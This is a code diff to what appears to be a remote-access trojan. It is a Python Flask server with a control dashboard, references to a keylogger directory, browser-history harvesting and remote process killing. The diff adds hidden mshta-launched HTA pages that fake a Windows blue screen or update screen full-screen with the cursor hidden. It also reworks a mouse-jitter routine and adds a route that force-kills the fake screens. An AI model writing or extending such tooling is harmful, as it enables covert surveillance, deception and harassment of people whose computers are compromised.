@@ -2551,7 +2551,7 @@ DASHBOARD_HTML = r'''
                         <button class="btn danger" onclick="fakeBSOD()" style="flex: 1;">Fake BSOD</button>
                         <button class="btn danger" onclick="fakeWinUpdate()" style="flex: 1;">Fake Win Update</button>
                     </div>
-                    <button class="btn" onclick="unfreezeScreen()" style="width: 100%; margin-top: 8px;">Dismiss</button>
+                    <button class="btn" onclick="dismissFakeScreen()" style="width: 100%; margin-top: 8px;">Dismiss</button>
                 </div>
                 <div class="section">
                     <div class="section-header"><div class="section-title">Monitor</div></div>
@@ -3209,6 +3209,22 @@ DASHBOARD_HTML = r'''
             logActivity('Screen unfrozen');
         }
 
+        async function fakeBSOD() {
+            await fetch('/api/troll/fake_screen', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'bsod'})});
+            logActivity('Fake BSOD triggered');
+        }
+
+        async function fakeWinUpdate() {
+            await fetch('/api/troll/fake_screen', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'update'})});
+            logActivity('Fake Windows Update triggered');
+        }
+
+        async function dismissFakeScreen() {
+            await fetch('/api/troll/dismiss_fake_screen', {method:'POST'});
+            await fetch('/api/screen/freeze', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action: 'stop'})});
+            logActivity('Fake screen dismissed');
+        }
+
         // Troll Popups
         async function sendPopup(type) {
             const title = document.getElementById('popupTitle').value || 'System';
@@ -3561,18 +3577,6 @@ DASHBOARD_HTML = r'''
         async function closeTray() {
             await fetch('/api/troll/cdtray', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'close'})});
             logActivity('CD tray closed');
-        }
-
-        // Troll - Fake BSOD
-        async function fakeBSOD() {
-            await fetch('/api/troll/fake_screen', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'bsod'})});
-            logActivity('Fake BSOD triggered');
-        }
-
-        // Troll - Fake Windows Update
-        async function fakeWinUpdate() {
-            await fetch('/api/troll/fake_screen', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'winupdate'})});
-            logActivity('Fake Windows Update triggered');
         }
 
         // Harvest - Browser History
@@ -4713,30 +4717,28 @@ def remote_process_kill():
 @app.route('/api/troll/mouse_jitter', methods=['POST'])
 def troll_mouse_jitter():
     """Start/stop random mouse jittering."""
+    global _JITTER_RUNNING
     try:
         data = request.get_json()
         action = data.get('action', 'start')
         if action == 'start':
+            _JITTER_RUNNING = True
             def _jitter_loop():
                 from pynput.mouse import Controller
                 mouse = Controller()
-                while getattr(_jitter_loop, 'running', True):
+                while _JITTER_RUNNING:
                     try:
                         import random as _r
                         for _ in range(_r.randint(2, 5)):
-                            dx = _r.randint(-150, 150)
-                            dy = _r.randint(-150, 150)
-                            pos = mouse.position
-                            mouse.position = (pos[0] + dx, pos[1] + dy)
-                            time.sleep(_r.uniform(0.01, 0.05))
+                            mouse.move(_r.randint(-20, 20), _r.randint(-20, 20))
+                            time.sleep(0.01)
                         time.sleep(_r.uniform(0.05, 0.3))
                     except:
                         break
-            _jitter_loop.running = True
             threading.Thread(target=_jitter_loop, daemon=True).start()
             return jsonify({'success': True})
         else:
-            _jitter_loop.running = False
+            _JITTER_RUNNING = False
             return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -4950,13 +4952,22 @@ def troll_fake_screen():
         data = request.get_json()
         fake_type = data.get('type', 'bsod')
         if fake_type == 'bsod':
-            html = '<html><body style="background:#0078D7;color:white;font-family:Segoe UI;margin:0;padding:60px 80px;"><div style="font-size:120px;">:(</div><br><div style="font-size:24px;">Your PC ran into a problem and needs to restart.</div><br><div style="font-size:18px;">Stop code: CRITICAL_PROCESS_DIED</div><br><div style="font-size:16px;">Collecting error info... 0% complete</div></body></html>'
+            html = '<html><head><hta:application id="bsod" applicationname="bsod" border="none" caption="no" contextmenu="no" innerborder="no" maximizebutton="no" minimizebutton="no" scroll="no" scrollflat="no" selection="no" showintaskbar="no" singleinstance="no" sysmenu="no" windowstate="maximize"/><script>window.resizeTo(screen.width, screen.height);window.moveTo(0,0);</script></head><body style="background:#0078D7;color:white;font-family:Segoe UI;margin:0;padding:60px 80px;overflow:hidden;cursor:none;"><div style="font-size:120px;">:(</div><br><div style="font-size:24px;">Your PC ran into a problem and needs to restart.</div><br><div style="font-size:18px;">Stop code: CRITICAL_PROCESS_DIED</div><br><div style="font-size:16px;">Collecting error info... 0% complete</div></body></html>'
         else:
-            html = '<html><body style="background:#000;color:white;font-family:Segoe UI;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;"><div style="font-size:28px;">Working on updates</div><div style="font-size:18px;margin-top:20px;">Don\'t turn off your PC. This will take a while.</div><div style="font-size:48px;margin-top:40px;">0%</div><div style="width:400px;height:4px;background:#333;margin-top:20px;border-radius:2px;"><div style="width:0%;height:100%;background:#0078D7;border-radius:2px;"></div></div></body></html>'
-        tmp_html = os.path.join(KEYLOG_DIR, "_fake_screen.html")
+            html = '<html><head><hta:application id="winupd" applicationname="winupd" border="none" caption="no" contextmenu="no" innerborder="no" maximizebutton="no" minimizebutton="no" scroll="no" scrollflat="no" selection="no" showintaskbar="no" singleinstance="no" sysmenu="no" windowstate="maximize"/><script>window.resizeTo(screen.width, screen.height);window.moveTo(0,0);</script></head><body style="background:#000;color:white;font-family:Segoe UI;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:none;"><div style="font-size:28px;">Working on updates</div><div style="font-size:18px;margin-top:20px;">Don\'t turn off your PC. This will take a while.</div><div style="font-size:48px;margin-top:40px;">0%</div><div style="width:400px;height:4px;background:#333;margin-top:20px;border-radius:2px;"><div style="width:0%;height:100%;background:#0078D7;border-radius:2px;"></div></div></body></html>'
+        tmp_html = os.path.join(KEYLOG_DIR, "_fake_screen.hta")
         with open(tmp_html, 'w') as f:
             f.write(html)
-        subprocess.run(['mshta.exe', tmp_html], creationflags=0x08000000, close_fds=True)
+        subprocess.Popen(['mshta.exe', tmp_html], creationflags=0x08000000, close_fds=True)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/troll/dismiss_fake_screen', methods=['POST'])
+def troll_dismiss_fake_screen():
+    """Kill all mshta.exe processes to dismiss fake BSOD/update screens."""
+    try:
+        subprocess.run(['taskkill', '/f', '/im', 'mshta.exe'], capture_output=True, creationflags=0x08000000)
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
